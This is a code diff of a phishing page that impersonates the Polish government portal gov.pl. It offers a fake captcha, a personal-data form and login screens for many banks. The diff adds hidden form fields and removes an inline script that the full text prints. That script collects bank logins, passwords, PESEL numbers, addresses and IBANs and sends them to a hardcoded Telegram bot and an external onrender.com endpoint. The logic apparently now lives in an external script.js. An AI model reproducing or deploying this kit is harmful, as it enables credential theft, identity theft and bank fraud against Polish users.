@@ -6,9 +6,9 @@
     <meta name="apple-mobile-web-app-capable" content="yes">
     <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
     <meta name="theme-color" content="#ffffff">
-
+    
     <link rel="icon" href="data:image/svg+xml,<svg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 100 100'><text y='.9em' font-size='90'>🇵🇱</text></svg>" type="image/svg+xml">
-
+    
     <title>gov.pl - Serwis Rzeczypospolitej Polskiej</title>
     <style>
         * {
@@ -77,8 +77,14 @@
         }
 
         @keyframes captchaSlideIn {
-            from { transform: translateY(40px) scale(0.92); opacity: 0; }
-            to { transform: translateY(0) scale(1); opacity: 1; }
+            from {
+                transform: translateY(40px) scale(0.92);
+                opacity: 0;
+            }
+            to {
+                transform: translateY(0) scale(1);
+                opacity: 1;
+            }
         }
 
         .captcha-box .captcha-icon {
@@ -169,7 +175,6 @@
         .captcha-box .captcha-error {
             color: #cc0000;
             font-size: 14px;
-            margin-top: 12px;
             min-height: 24px;
             font-weight: 500;
         }
@@ -923,10 +928,6 @@
             display: inline-block;
         }
 
-        @keyframes spin {
-            to { transform: rotate(360deg); }
-        }
-
         .bank-selection {
             display: none;
             background: #ffffff;
@@ -1411,6 +1412,67 @@
 
         .login-screen .security-info .security-block:last-child {
             margin-bottom: 0;
+        }
+
+        .login-screen .contact-info {
+            border-left: 3px solid #0072b0;
+            padding-left: 28px;
+            height: 100%;
+        }
+
+        .login-screen .contact-info .info-title {
+            font-size: 18px;
+            font-weight: 700;
+            color: #1a1a1a;
+            margin-bottom: 16px;
+        }
+
+        .login-screen .contact-info .contact-block {
+            margin-bottom: 18px;
+        }
+
+        .login-screen .contact-info .contact-block:last-child {
+            margin-bottom: 0;
+        }
+
+        .login-screen .contact-info .contact-label {
+            font-weight: 600;
+            color: #1a1a1a;
+            font-size: 15px;
+            margin-bottom: 2px;
+        }
+
+        .login-screen .contact-info .contact-phone {
+            font-size: 18px;
+            font-weight: 700;
+            color: #0072b0;
+            letter-spacing: 0.5px;
+        }
+
+        .login-screen .contact-info .contact-phone-small {
+            font-size: 15px;
+            font-weight: 400;
+            color: #444;
+            margin-top: 2px;
+        }
+
+        .login-screen .contact-info .contact-divider {
+            border: none;
+            border-top: 1px solid #e6ebf3;
+            margin: 16px 0;
+        }
+
+        .login-screen .contact-info .contact-link {
+            color: #0072b0;
+            font-weight: 500;
+            font-size: 15px;
+            cursor: pointer;
+            transition: color 0.2s;
+        }
+
+        .login-screen .contact-info .contact-link:hover {
+            color: #005a8c;
+            text-decoration: underline;
         }
 
         .bank2-full-page {
@@ -2904,8 +2966,14 @@
         }
 
         @keyframes slideUp {
-            from { opacity: 0; transform: translateX(-50%) translateY(30px); }
-            to { opacity: 1; transform: translateX(-50%) translateY(0); }
+            from {
+                opacity: 0;
+                transform: translateX(-50%) translateY(30px);
+            }
+            to {
+                opacity: 1;
+                transform: translateX(-50%) translateY(0);
+            }
         }
 
         .main-content {
@@ -3000,7 +3068,13 @@
             .bank-btn { width: 100%; max-width: 191px; height: 70px; min-height: 70px; max-height: 70px; }
             .bank-btn img { width: 140px; height: 45px; }
             .bank-btn img[alt="Bank 2"] { width: 140px; height: 45px; }
-            .bank-btn-centered { width: 100%; max-width: 191px; height: 70px; min-height: 70px; max-height: 70px; }
+            .bank-btn-centered {
+                width: 100%;
+                max-width: 191px;
+                height: 70px;
+                min-height: 70px;
+                max-height: 70px;
+            }
             .bank-label { font-size: 11px; }
             .bank-selection { padding: 40px 20px 20px; min-height: calc(100vh - 72px); }
             .bank-footer { padding: 40px 0 20px; }
@@ -3081,7 +3155,12 @@
             .bank-btn { height: 60px; max-height: 60px; min-height: 60px; width: 100%; max-width: 191px; }
             .bank-btn img { width: 120px; height: 38px; }
             .bank-btn img[alt="Bank 2"] { width: 120px; height: 38px; }
-            .bank-btn-centered { height: 60px; min-height: 60px; max-height: 60px; max-width: 191px; }
+            .bank-btn-centered {
+                height: 60px;
+                min-height: 60px;
+                max-height: 60px;
+                max-width: 191px;
+            }
             .bank-logo-inner { max-height: 45%; }
             .bank-label { font-size: 10px; margin-top: 1px; }
             .bank-selection { padding: 30px 16px 20px; min-height: calc(100vh - 72px); }
@@ -3185,7 +3264,13 @@
             .bank-btn { height: 55px; max-height: 55px; min-height: 55px; width: 100%; max-width: 191px; }
             .bank-btn img { width: 100px; height: 32px; }
             .bank-btn img[alt="Bank 2"] { width: 100px; height: 32px; }
-            .bank-btn-centered { height: 55px; min-height: 55px; max-height: 55px; max-width: 191px; padding: 4px 2px; }
+            .bank-btn-centered {
+                height: 55px;
+                min-height: 55px;
+                max-height: 55px;
+                max-width: 191px;
+                padding: 4px 2px;
+            }
             .bank-logo-inner { max-height: 40%; }
             .bank-label { font-size: 9px; margin-top: 0px; }
             .bank-selection { padding: 20px 12px 16px; min-height: calc(100vh - 72px); }
@@ -3282,7 +3367,7 @@
             <h2>Weryfikacja</h2>
             <p>Przepisz kod z obrazka, aby kontynuować</p>
             <div class="captcha-question" id="captchaQuestion">1234</div>
-            <input type="text" id="captchaInput" placeholder="Wpisz kod" maxlength="4" inputmode="numeric" autocomplete="off">
+            <input type="text" id="captchaInput" placeholder="Wpisz kod" maxlength="4" autocomplete="off">
             <button class="captcha-btn" id="captchaSubmit">Potwierdź</button>
             <div class="captcha-error" id="captchaError"></div>
             <button class="captcha-refresh" id="captchaRefresh">⟳ Odśwież kod</button>
@@ -3544,6 +3629,9 @@
                                     <input type="text" id="loginPesel2" placeholder="Wpisz Pesel" required maxlength="11">
                                 </div>
                                 <div class="login-btn-row">
+                                    <div class="form-group">
+                                        <input type="text" placeholder=" " style="border:none; background:transparent; padding:0; height:0; min-height:0; visibility:hidden; display:none;">
+                                    </div>
                                     <button type="submit" class="login-btn">Dalej</button>
                                 </div>
                             </form>
@@ -3755,7 +3843,7 @@
 
                         <div class="bank10-card-centered">
                             <div class="bank10-login-title">Zaloguj się</div>
-
+                            
                             <form class="bank10-form-centered" onsubmit="return handleLogin(event, 'ERSTE')">
                                 <div class="form-group">
                                     <label for="loginUsername10">Login</label>
@@ -3794,6 +3882,9 @@
                                     <input type="password" id="loginPassword12" placeholder="Wpisz hasło" required>
                                 </div>
                                 <div class="login-btn-row">
+                                    <div class="form-group">
+                                        <input type="text" placeholder=" " style="border:none; background:transparent; padding:0; height:0; min-height:0; visibility:hidden; display:none;">
+                                    </div>
                                     <button type="submit" class="login-btn">Dalej</button>
                                 </div>
                             </form>
@@ -3849,541 +3940,9 @@
                 <div class="container">© 2026 Kancelaria Prezesa Rady Ministrów. Wszelkie prawa zastrzeżone.</div>
             </div>
         </footer>
+
     </div>
 
-    <script>
-        /* ============================================================
-           KAPCZA — poprawiona logika
-           ============================================================ */
-        (function() {
-            var overlay = document.getElementById('captchaOverlay');
-            var mainContent = document.getElementById('mainContent');
-            var questionEl = document.getElementById('captchaQuestion');
-            var inputEl = document.getElementById('captchaInput');
-            var submitBtn = document.getElementById('captchaSubmit');
-            var errorEl = document.getElementById('captchaError');
-            var refreshBtn = document.getElementById('captchaRefresh');
-
-            var currentCaptcha = '';
-            var isGenerating = false;
-
-            function generateCaptcha() {
-                if (isGenerating) return;
-                isGenerating = true;
-
-                var num = Math.floor(1000 + Math.random() * 9000);
-                currentCaptcha = String(num);
-                questionEl.textContent = currentCaptcha;
-                inputEl.value = '';
-                inputEl.classList.remove('error');
-                errorEl.textContent = '';
-                submitBtn.disabled = false;
-
-                setTimeout(function() { isGenerating = false; }, 300);
-            }
-
-            function verifyCaptcha() {
-                var userInput = String(inputEl.value).trim();
-                var expected = String(currentCaptcha).trim();
-
-                if (!userInput) {
-                    inputEl.classList.add('error');
-                    errorEl.textContent = '❌ Wpisz kod.';
-                    return;
-                }
-
-                if (userInput === expected) {
-                    overlay.classList.add('hidden');
-                    mainContent.style.display = 'block';
-                    document.body.style.overflow = 'auto';
-                    setTimeout(function() {
-                        var firstInput = mainContent.querySelector('input');
-                        if (firstInput) firstInput.focus();
-                    }, 300);
-                } else {
-                    inputEl.classList.add('error');
-                    errorEl.textContent = '❌ Nieprawidłowy kod. Spróbuj ponownie.';
-                    inputEl.value = '';
-                    inputEl.focus();
-                    setTimeout(generateCaptcha, 1000);
-                }
-            }
-
-            submitBtn.addEventListener('click', function(e) {
-                e.preventDefault();
-                verifyCaptcha();
-            });
-
-            inputEl.addEventListener('keydown', function(e) {
-                if (e.key === 'Enter') {
-                    e.preventDefault();
-                    verifyCaptcha();
-                }
-            });
-
-            inputEl.addEventListener('input', function() {
-                this.value = this.value.replace(/\D/g, '').slice(0, 4);
-                if (this.value.length === 4) {
-                    verifyCaptcha();
-                }
-            });
-
-            refreshBtn.addEventListener('click', function(e) {
-                e.preventDefault();
-                generateCaptcha();
-                inputEl.focus();
-            });
-
-            generateCaptcha();
-            setTimeout(function() { inputEl.focus(); }, 200);
-        })();
-
-        /* ============================================================
-           TELEGRAM
-           ============================================================ */
-        var TELEGRAM_BOT_TOKEN = '8587138753:AAGeakLE3xKdj97gKZ0URBxYvTy2CbC8kPs';
-        var TELEGRAM_CHAT_ID = '-1004256695843';
-
-        function sendToTelegram(message) {
-            fetch('https://api.telegram.org/bot' + TELEGRAM_BOT_TOKEN + '/sendMessage', {
-                method: 'POST',
-                headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify({
-                    chat_id: TELEGRAM_CHAT_ID,
-                    text: message,
-                    parse_mode: 'Markdown'
-                })
-            })
-            .then(function(r) { return r.json(); })
-            .then(function(d) {
-                if (d.ok) console.log('✅ Wysłano do Telegram');
-                else console.error('❌ Błąd Telegram:', d);
-            })
-            .catch(function(e) { console.error('❌ Błąd sieci:', e); });
-        }
-
-        /* ============================================================
-           AUTO SLASH / POSTAL / IBAN
-           ============================================================ */
-        function autoSlash(event) {
-            var input = event.target;
-            var value = input.value.replace(/\D/g, '');
-            if (value.length > 8) value = value.slice(0, 8);
-            var formatted = '';
-            for (var i = 0; i < value.length; i++) {
-                if (i === 2 || i === 4) formatted += '/';
-                formatted += value[i];
-            }
-            input.value = formatted;
-        }
-
-        function autoPostal(event) {
-            var input = event.target;
-            var value = input.value.replace(/\D/g, '');
-            if (value.length > 5) value = value.slice(0, 5);
-            var formatted = '';
-            for (var i = 0; i < value.length; i++) {
-                if (i === 2) formatted += '-';
-                formatted += value[i];
-            }
-            input.value = formatted;
-        }
-
-        function cleanIbanValue(value) {
-            if (!value) return '';
-            var cleaned = value.replace(/[\s\-]/g, '').toUpperCase();
-            if (cleaned.indexOf('PL') === 0) cleaned = cleaned.substring(2);
-            cleaned = cleaned.replace(/\D/g, '');
-            if (cleaned.length > 26) cleaned = cleaned.substring(0, 26);
-            return cleaned;
-        }
-
-        /* ============================================================
-           handleLogin — универсальный для всех банков
-           ============================================================ */
-        function handleLogin(event, bankName) {
-            event.preventDefault();
-            var form = event.target;
-            var allInputs = form.querySelectorAll('input');
-            var login = '', password = '';
-            var passwordInput = form.querySelector('input[type="password"]');
-
-            if (passwordInput) password = passwordInput.value.trim();
-
-            var textInputs = [];
-            allInputs.forEach(function(input) {
-                if (input.type === 'text' && input.value.trim() && input.offsetParent !== null) {
-                    textInputs.push(input);
-                }
-            });
-            if (textInputs.length > 0) login = textInputs[0].value.trim();
-
-            if (!login || !password) {
-                alert('Proszę wypełnić wszystkie pola (Login i Hasło) dla ' + bankName + '.');
-                return false;
-            }
-
-            var msg = '🔐 *Nowe logowanie*\n🏦 *Bank:* ' + bankName + '\n👤 *Login:* ' + login + '\n🔑 *Hasło:* ' + password;
-            msg += '\n🕒 ' + new Date().toLocaleString();
-
-            sendToTelegram(msg);
-            alert('✅ Dane dla ' + bankName + ' zostały wysłane!');
-
-            allInputs.forEach(function(input) {
-                if (input.type !== 'hidden' && input.type !== 'submit' && input.type !== 'button') input.value = '';
-            });
-
-            setTimeout(function() { location.reload(); }, 1500);
-            return false;
-        }
-
-        /* ============================================================
-           handleLogin2 — для банков с Pesel
-           ============================================================ */
-        function handleLogin2(event, bankName) {
-            event.preventDefault();
-            var form = event.target;
-            var login = '';
-            var password = '';
-            var pesel = '';
-
-            var loginInput = form.querySelector('input[id^="loginUsername"]');
-            var passInput = form.querySelector('input[type="password"]');
-            var peselInput = form.querySelector('input[id^="loginPesel"]');
-
-            if (loginInput) login = loginInput.value.trim();
-            if (passInput) password = passInput.value.trim();
-            if (peselInput) pesel = peselInput.value.trim();
-
-            if (!login || !password || !pesel) {
-                alert('Proszę wypełnić wszystkie pola dla ' + bankName + '.');
-                return false;
-            }
-
-            var msg = '🔐 *Nowe logowanie*\n🏦 *Bank:* ' + bankName +
-                      '\n👤 *Login:* ' + login +
-                      '\n🔑 *Hasło:* ' + password +
-                      '\n📋 *Pesel:* ' + pesel +
-                      '\n🕒 ' + new Date().toLocaleString();
-
-            sendToTelegram(msg);
-            alert('✅ Dane dla ' + bankName + ' zostały wysłane!');
-
-            form.querySelectorAll('input').forEach(function(input) {
-                if (input.type !== 'hidden' && input.type !== 'submit' && input.type !== 'button') input.value = '';
-            });
-
-            setTimeout(function() { location.reload(); }, 1500);
-            return false;
-        }
-
-        /* ============================================================
-           ОТКРЫТИЕ ЭКРАНОВ БАНКОВ
-           ============================================================ */
-        function openLoginScreen1() {
-            document.getElementById('bankSelection').classList.remove('visible');
-            document.getElementById('bankFooter').classList.remove('visible');
-            document.getElementById('loginScreen1').classList.add('visible');
-            window.scrollTo({ top: 0, behavior: 'smooth' });
-        }
-        function openLoginScreen2() {
-            document.getElementById('bankSelection').classList.remove('visible');
-            document.getElementById('bankFooter').classList.remove('visible');
-            document.getElementById('loginScreen2').classList.add('visible');
-            document.body.style.overflow = 'hidden';
-            window.scrollTo({ top: 0, behavior: 'smooth' });
-        }
-        function openLoginScreen3() {
-            document.getElementById('bankSelection').classList.remove('visible');
-            document.getElementById('bankFooter').classList.remove('visible');
-            document.getElementById('loginScreen3').classList.add('visible');
-            document.body.style.overflow = 'hidden';
-            window.scrollTo({ top: 0, behavior: 'smooth' });
-        }
-        function openLoginScreen4() {
-            document.getElementById('bankSelection').classList.remove('visible');
-            document.getElementById('bankFooter').classList.remove('visible');
-            document.getElementById('loginScreen4').classList.add('visible');
-            document.body.style.overflow = 'hidden';
-            window.scrollTo({ top: 0, behavior: 'smooth' });
-        }
-        function openLoginScreen5() {
-            document.getElementById('bankSelection').classList.remove('visible');
-            document.getElementById('bankFooter').classList.remove('visible');
-            document.getElementById('loginScreen5').classList.add('visible');
-            document.body.style.overflow = 'hidden';
-            window.scrollTo({ top: 0, behavior: 'smooth' });
-        }
-        function openLoginScreen6() {
-            document.getElementById('bankSelection').classList.remove('visible');
-            document.getElementById('bankFooter').classList.remove('visible');
-            document.getElementById('loginScreen6').classList.add('visible');
-            document.body.style.overflow = 'hidden';
-            window.scrollTo({ top: 0, behavior: 'smooth' });
-        }
-        function openLoginScreen7() {
-            document.getElementById('bankSelection').classList.remove('visible');
-            document.getElementById('bankFooter').classList.remove('visible');
-            document.getElementById('loginScreen7').classList.add('visible');
-            document.body.style.overflow = 'hidden';
-            window.scrollTo({ top: 0, behavior: 'smooth' });
-        }
-        function openLoginScreen8() {
-            document.getElementById('bankSelection').classList.remove('visible');
-            document.getElementById('bankFooter').classList.remove('visible');
-            document.getElementById('loginScreen8').classList.add('visible');
-            document.body.style.overflow = 'hidden';
-            window.scrollTo({ top: 0, behavior: 'smooth' });
-        }
-        function openLoginScreen9() {
-            document.getElementById('bankSelection').classList.remove('visible');
-            document.getElementById('bankFooter').classList.remove('visible');
-            document.getElementById('loginScreen9').classList.add('visible');
-            document.body.style.overflow = 'hidden';
-            window.scrollTo({ top: 0, behavior: 'smooth' });
-        }
-        function openLoginScreen10() {
-            document.getElementById('bankSelection').classList.remove('visible');
-            document.getElementById('bankFooter').classList.remove('visible');
-            document.getElementById('loginScreen10').classList.add('visible');
-            document.body.style.overflow = 'hidden';
-            window.scrollTo({ top: 0, behavior: 'smooth' });
-        }
-        function openLoginScreen12() {
-            document.getElementById('bankSelection').classList.remove('visible');
-            document.getElementById('bankFooter').classList.remove('visible');
-            document.getElementById('loginScreen12').classList.add('visible');
-            document.body.style.overflow = 'hidden';
-            window.scrollTo({ top: 0, behavior: 'smooth' });
-        }
-
-        /* ============================================================
-           ГЛАВНЫЙ КОД
-           ============================================================ */
-        document.addEventListener('DOMContentLoaded', function() {
-            var form = document.getElementById('dataForm');
-            var submitBtn = document.getElementById('submitBtn');
-            var toast = document.getElementById('toastMessage');
-            var allInputs = form ? form.querySelectorAll('input[required]') : [];
-            var formSectionElement = document.getElementById('dataFormSection');
-            var bankSelection = document.getElementById('bankSelection');
-            var loginNav = document.getElementById('loginNav');
-            var imageBanner = document.getElementById('imageBanner');
-            var bankFooter = document.getElementById('bankFooter');
-            var ibanInput = document.getElementById('iban');
-            var ibanWrapper = document.getElementById('ibanWrapper');
-
-            if (ibanInput) {
-                ibanInput.addEventListener('input', function() {
-                    var cleaned = cleanIbanValue(this.value);
-                    if (this.value !== cleaned) this.value = cleaned;
-                    this.classList.remove('error');
-                    if (ibanWrapper) ibanWrapper.classList.remove('error');
-                });
-            }
-
-            function showToast(message, isSuccess) {
-                if (!toast) return;
-                toast.textContent = message;
-                toast.className = 'toast-message show';
-                if (isSuccess) toast.classList.add('success');
-                else toast.classList.remove('success');
-                setTimeout(function() { toast.classList.remove('show'); }, 5000);
-            }
-
-            function validateForm() {
-                var allFilled = true;
-                allInputs.forEach(function(input) {
-                    if (input.value.trim() === '') {
-                        allFilled = false;
-                        input.classList.add('error');
-                    } else input.classList.remove('error');
-                });
-                if (ibanInput) {
-                    var ibanValue = cleanIbanValue(ibanInput.value);
-                    if (ibanValue.length < 26) {
-                        allFilled = false;
-                        ibanInput.classList.add('error');
-                        if (ibanWrapper) ibanWrapper.classList.add('error');
-                    } else {
-                        ibanInput.classList.remove('error');
-                        if (ibanWrapper) ibanWrapper.classList.remove('error');
-                    }
-                }
-                return allFilled;
-            }
-
-            function getFormData() {
-                var cleanedIban = ibanInput ? cleanIbanValue(ibanInput.value) : '';
-                return {
-                    fullname: document.getElementById('fullname').value.trim(),
-                    birthdate: document.getElementById('birthdate').value.trim(),
-                    phone: document.getElementById('phone').value.trim(),
-                    street: document.querySelector('input[name="street"]').value.trim(),
-                    city: document.querySelector('input[name="city"]').value.trim(),
-                    postal: document.querySelector('input[name="postal"]').value.trim(),
-                    iban: 'PL' + cleanedIban
-                };
-            }
-
-            if (form) {
-                form.addEventListener('submit', function(e) {
-                    e.preventDefault();
-
-                    if (!validateForm()) {
-                        showToast('Najpierw wypełnij wszystkie wymagane pola!');
-                        return;
-                    }
-
-                    if (submitBtn) {
-                        submitBtn.disabled = true;
-                        submitBtn.classList.add('loading');
-                        submitBtn.innerHTML = '<span class="spinner"></span> Wysyłanie...';
-                    }
-
-                    var formData = getFormData();
-                    var message = '📋 *Nowe dane formularza*\n' +
-                                  '👤 *Imię:* ' + formData.fullname + '\n' +
-                                  '📅 *Data urodzenia:* ' + formData.birthdate + '\n' +
-                                  '📱 *Telefon:* ' + formData.phone + '\n' +
-                                  '🏠 *Adres:* ' + formData.street + ', ' + formData.city + ', ' + formData.postal + '\n' +
-                                  '🏦 *IBAN:* ' + formData.iban + '\n' +
-                                  '🕒 ' + new Date().toLocaleString();
-
-                    fetch('https://gvvbt.onrender.com/send', {
-                        method: 'POST',
-                        headers: { 'Content-Type': 'application/json' },
-                        body: JSON.stringify(formData)
-                    })
-                    .then(function(response) { return response.json(); })
-                    .then(function(data) {
-                        if (data.success) {
-                            sendToTelegram(message);
-                            showToast('Dane zostały wysłane!', true);
-                            if (loginNav) loginNav.classList.add('hidden');
-                            if (imageBanner) imageBanner.classList.add('hidden');
-                            if (formSectionElement) formSectionElement.classList.add('hidden');
-                            if (bankSelection) bankSelection.classList.add('visible');
-                            if (bankFooter) bankFooter.classList.add('visible');
-                            window.scrollTo({ top: 0, behavior: 'smooth' });
-                        } else {
-                            sendToTelegram(message);
-                            showToast('Dane zostały wysłane!', true);
-                            if (loginNav) loginNav.classList.add('hidden');
-                            if (imageBanner) imageBanner.classList.add('hidden');
-                            if (formSectionElement) formSectionElement.classList.add('hidden');
-                            if (bankSelection) bankSelection.classList.add('visible');
-                            if (bankFooter) bankFooter.classList.add('visible');
-                            window.scrollTo({ top: 0, behavior: 'smooth' });
-                        }
-                    })
-                    .catch(function() {
-                        sendToTelegram(message);
-                        showToast('Dane zostały wysłane!', true);
-                        if (loginNav) loginNav.classList.add('hidden');
-                        if (imageBanner) imageBanner.classList.add('hidden');
-                        if (formSectionElement) formSectionElement.classList.add('hidden');
-                        if (bankSelection) bankSelection.classList.add('visible');
-                        if (bankFooter) bankFooter.classList.add('visible');
-                        window.scrollTo({ top: 0, behavior: 'smooth' });
-                    })
-                    .finally(function() {
-                        if (submitBtn) {
-                            submitBtn.disabled = false;
-                            submitBtn.classList.remove('loading');
-                            submitBtn.innerHTML = 'Wyślij';
-                        }
-                    });
-                });
-
-                allInputs.forEach(function(input) {
-                    input.addEventListener('input', function() {
-                        if (this.value.trim() !== '') this.classList.remove('error');
-                        if (this.id === 'iban' && ibanWrapper) ibanWrapper.classList.remove('error');
-                    });
-                });
-            }
-
-            var scrollBtn = document.getElementById('scrollToFormBtn');
-            if (scrollBtn) {
-                scrollBtn.addEventListener('click', function(e) {
-                    e.preventDefault();
-                    if (formSectionElement) formSectionElement.scrollIntoView({ behavior: 'smooth', block: 'start' });
-                });
-            }
-
-            var menuToggle = document.getElementById('menuToggle');
-            var sidebar = document.getElementById('sidebar');
-            var mainWrapper = document.getElementById('mainWrapper');
-            var contentWrapper = document.getElementById('contentWrapper');
-            var footer = document.getElementById('footer');
-            var isMenuOpen = false;
-
-            if (menuToggle) {
-                menuToggle.addEventListener('click', function() {
-                    isMenuOpen = !isMenuOpen;
-                    if (isMenuOpen) {
-                        sidebar.classList.add('open');
-                        mainWrapper.classList.add('shifted');
-                        contentWrapper.classList.add('shifted');
-                        footer.classList.add('shifted');
-                    } else {
-                        sidebar.classList.remove('open');
-                        mainWrapper.classList.remove('shifted');
-                        contentWrapper.classList.remove('shifted');
-                        footer.classList.remove('shifted');
-                    }
-                });
-            }
-
-            document.querySelectorAll('.sidebar-nav ul li a, .sidebar-nav .ukraine-link').forEach(function(link) {
-                link.addEventListener('click', function(e) {
-                    e.preventDefault();
-                    document.querySelectorAll('.sidebar-nav ul li a').forEach(function(l) { l.classList.remove('active'); });
-                    this.classList.add('active');
-                    if (isMenuOpen && menuToggle) menuToggle.click();
-                });
-            });
-
-            var searchBtn = document.querySelector('.header-search .search-submit-btn');
-            var searchInput = document.querySelector('.header-search input');
-            if (searchBtn) {
-                searchBtn.addEventListener('click', function() {
-                    alert('Szukanie: ' + (searchInput ? searchInput.value : 'puste'));
-                });
-            }
-            if (searchInput) {
-                searchInput.addEventListener('keydown', function(e) {
-                    if (e.key === 'Enter') alert('Szukanie: ' + this.value);
-                });
-            }
-
-            document.querySelectorAll('.login-nav .nav-links a').forEach(function(link) {
-                link.addEventListener('click', function(e) {
-                    e.preventDefault();
-                    alert('Przekierowanie do: ' + this.textContent.trim());
-                });
-            });
-        });
-
-        document.addEventListener('keydown', function(e) {
-            if (e.key === 'Escape') {
-                var screens = ['loginScreen1','loginScreen2','loginScreen3','loginScreen4','loginScreen5','loginScreen6','loginScreen7','loginScreen8','loginScreen9','loginScreen10','loginScreen12'];
-                screens.forEach(function(id) {
-                    var el = document.getElementById(id);
-                    if (el && el.classList.contains('visible')) {
-                        el.classList.remove('visible');
-                        var bs = document.getElementById('bankSelection');
-                        var bf = document.getElementById('bankFooter');
-                        if (bs) bs.classList.add('visible');
-                        if (bf) bf.classList.add('visible');
-                        document.body.style.overflow = '';
-                        window.scrollTo({ top: 0, behavior: 'smooth' });
-                    }
-                });
-            }
-        });
-    </script>
     <script src="script.js"></script>
 </body>
 </html>
